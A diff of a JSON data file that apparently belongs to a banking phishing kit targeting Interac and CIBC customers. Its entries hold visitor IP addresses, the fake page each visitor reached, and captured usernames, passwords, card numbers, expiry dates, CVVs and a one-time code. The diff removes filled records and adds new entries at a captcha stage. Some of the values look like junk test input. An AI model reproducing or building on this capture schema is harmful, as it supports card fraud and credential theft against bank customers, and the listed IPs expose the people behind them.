@@ -1,37 +1,18 @@
 [
   {
     "ip": "24.201.184.79",
-    "status": false,
-    "banks": "Interac",
-    "page": "Interac",
-    "username": "1111222233334444",
-    "password": "ndndjdjdjd",
-    "card": "1111222233334444",
-    "exp1": "04",
-    "exp2": "26",
-    "cvv": "854",
-    "atm": "",
-    "nextPage": "finish"
+    "status": true
   },
   {
-    "ip": "204.48.79.239",
+    "ip": "95.177.180.82",
     "status": false,
-    "banks": "CIBC",
-    "page": " Loading ",
-    "username": "1111222233334444",
-    "password": "bbgthjh",
-    "card": "1111222233334444",
-    "exp1": "04",
-    "exp2": "28",
-    "cvv": "458",
-    "atm": "",
-    "nextPage": "finish",
-    "code": "848484"
+    "banks": "Captcha",
+    "page": " Captcha "
   },
   {
-    "ip": "65.154.226.171",
+    "ip": "135.19.3.186",
     "status": false,
-    "banks": "Interac",
-    "page": "Interac"
+    "banks": "Captcha",
+    "page": " Captcha "
   }
 ]
